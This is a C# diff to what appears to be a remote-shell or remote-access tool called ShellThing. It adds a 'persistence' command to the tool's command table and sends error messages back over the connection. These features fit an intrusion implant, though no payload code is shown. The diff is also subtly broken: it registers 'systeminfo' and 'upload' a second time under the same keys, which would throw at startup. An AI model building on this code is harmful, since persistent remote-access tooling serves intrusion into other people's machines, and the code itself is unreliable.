@@ -1,4 +1,5 @@
-﻿using System;
+﻿using ShellThing.Commands;
+using System;
 using System.Collections;
 using System.Collections.Generic;
 using System.Text;
@@ -21,6 +22,10 @@ namespace ShellThing
             commands.Add("handoff", new HandoffCommand());
             commands.Add("systeminfo", new SystemInfoCommand());
             commands.Add("upload", new UploadCommand()); 
+            commands.Add("persistence", new PersistenceCommand());
+            commands.Add("systeminfo", new SystemInfoCommand());
+            commands.Add("upload", new UploadCommand());
+
             // Keep adding commands and their classes to the hashtable here
         }
 
@@ -42,6 +47,17 @@ namespace ShellThing
             catch (NullReferenceException)
             {
                 connection.SendData($"Invalid Command: {commandFullString}\n");
+            }
+            catch (Exception e)
+            {
+                if (e.InnerException != null)
+                {
+                    connection.SendData($"Error: {e.InnerException.Message}\n");
+                }
+                else
+                {
+                    connection.SendData($"Error: {e.Message}\n");
+                }
             }
         }
 
